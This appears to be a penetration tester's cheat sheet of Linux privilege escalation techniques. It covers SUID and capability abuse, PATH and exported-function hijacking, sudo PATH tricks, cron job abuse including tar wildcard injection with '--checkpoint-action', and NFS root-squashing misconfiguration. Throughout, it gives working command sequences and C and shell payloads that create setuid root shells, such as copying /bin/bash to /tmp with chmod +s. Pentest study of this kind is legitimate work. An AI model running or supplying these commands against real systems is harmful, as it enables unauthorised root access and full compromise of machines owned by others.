

# SUID

1. find / -perm -u=s -type f 2>/dev/null
2. gtfobins



# Shared Object Injection


1. find / -perm -u=s -type f 2>/dev/null
2. ./fname
3. strace fname 2>&1 | grep -i -E "open|access|no such file"
4. select one of the no such file and then use the code from the Codes.txt 


# Binary Symlinks

1. Bug in nginx(http & reverse proxy server)
2. Not easy manually.
3. issue in the perms of logs created.
4. nginx<1.6.2
5. ls -la /var/log/nginx
6. if the logs are writeable
7. use the nginx-root.sh and direct it to the the writeable nginx


# Environmental Variables -1 

*THIS METHOD ONLY WORKS IF THE WHOLE PATH OF THE FUNC ISNT BEING CALLED, FOR FULL PATH CHECK Environmental Variables-2*

1. env
2. find / -perm -u=s -type f 2>/dev/null
3. ./fname1
4. strings fname1->might get some inbuilt SUID func such as service (service start apache2) -> name it fname2 
5. echo 'int main() {setgid(0);setuid(0);system("/bin/bash");}' > /tmp/fname2.c
6. gcc  /tmp/fname2.c -o /tmp/fname2 
7. export PATH =/tmp:$PATH
8. ./fname1



# Environmental Variables - 2


**HERE FULL PATH IS BEING CALLED**

1. first four steps are the same

2. Create a malicious function
3. CODE: function fullPathofFuncFname2() {cp /bin/bash /tmp && chmod +s  /tmp/bash && /tmp/bash -p;}
4. EX:  function  /usr/sbin/service()   {cp /bin/bash /tmp && chmod +s  /tmp/bash && /tmp/bash -p;}

5. export -f fullPathofFuncFname2()
6. ./fname1

# Sudo shell escaping -2 

1. sudo -l -> /path/fname 
2. ls -al -> not writeable
3. cat /path/fname -> cmds like, find, cat, etc with sudo perms
4. to get root

5. echo "/bin/bash" > cmdname
6. chmod +x cmdname 
7. sudo PATH=`pwd`:$PATH /path/fname -> root  

Capabilities
-------------------
1. +ep
2. getcap -r / 2>/dev/null --> some program with elevated capbilities
3. For example if we get /usr/bin/python2.6, we can do the following:
4. python2.6 -c 'import os;os.setuid(0);os.system("/bin/bash")' --> a root shell
5. EX:- tar,openssl,perl etc etc 

# Cron Jobs
cat /etc/crontab

### Multiple ways of accessing information about cron jobs

https://github.com/RustySoldier/PentestSheet/tree/main/OtherCheatSheets
#### NOTE: for all the following escalation the program should be running as root to escalate to root
## Escalation via Cron paths
If we can access Cron jobs from any of the cmds mentioned in the link above 
and get something like the following
![image](https://user-images.githubusercontent.com/115465242/194920627-82b0d2f4-dee1-4f9c-8682-1d6351e660a1.png)

#### this is a jackpot
The all asterix means that the program is running every minute. Even if dont get all asterix we can still attack through this methodology but will have to wait for that much amount of time.

The program **overwrite.sh** here doesn't have an absolute path mentioned so it will check through each of the '\$PATH' values and then execute wherever it finds overwrite.sh first

We are going to exploit this to our adv.
### NOTE: \$PATH = /firstPath:/secondPath:...
### Commands:
1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >/firstPath
2. ls -al /tmp/bash and **WAIT**! (till it gets updated)
3. /tmp/bash -p
4. SHELL ACQUIRED

## Escalation via   Cron WildCards
First get the Cron Jobs List.
If there is no escalation via cron paths possible take a look into the programs itself. 
If a command in the program has wildcards entries **"\*"**, it can be manipulated to elevate shell

### FOR EXAMPLE
In the above picture we have another program that runs every minute: compress.sh; It has a defined path so escalation via Cron Paths isnt possible
If we cat out it's content we have
![image](https://user-images.githubusercontent.com/115465242/194927827-08f03413-6656-4fb4-8fe7-99716948b477.png)
The command **TAR** is taking a wildcard entry.
The program simply goes to **/home/user** and compresses everything present in the directory
NOW MOVING ON TO THE EXPLOITATION 
#### NOTE: THE FOLLOWING COMMANDS ARE TAR SPECIFIC,THEY WON'T WORK FOR OTHER CMDs
### Commands:
 1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >/home/user/runme.sh
 2. chmod +x runme.sh
 3. touch /home/user/--checkpoint=1
 4. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
 5. **WAIT**
 6. /tmp/bash -p -> root

So what it does is Tar --checkpoint=1 gives status update/ or does an action every time something is compressed and Tar --checkpoint-action defines what the action is supposed to be. So due to wildcard the above list of command converts to **Tar --checkpoint=1 --checkpoint-action=exec=sh\runme.sh**; Hence giving us a shell with root perms
 
## Escalation via Cron job files overwrite
Get the Cron jobs list
ls -al on the programs to find any writeable file rwx---**rw-** 
Then just use the following command to get a escalated shell
### Command:
1. locate progname
2. ls -al /fullpath/progname
3. If  rwx---**rw-** 
4. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >>/fullpath/progname
5. **WAIT**
6. SHELL


# NFS Root Squashing
cat /etc/exports
![image](https://user-images.githubusercontent.com/115465242/195032797-2663bf26-9e32-4680-ab95-1505ce231c30.png)
This implies that the folder /tmp is mountable as root 

#### From attack machine:
1. showmount -e  IPofVictimMachine
2. mkdir /tmp/mountme
3. mount -o rw,vers=2 IPofVictimMachine:/foldername(HERE /tmp) /tmp/mountme
4. echo 'int main() {setuid(0);setgid(0);system("/bin/bash");return 0}' > /tmp/mountme/fname.c
5. gcc /tmp/mountme/fname.c -o /tmp/mountme/fname
6. chmod +s /tmp/mountme/fname

#### Back to victim machine
1. cd /tmp
2. ./fname
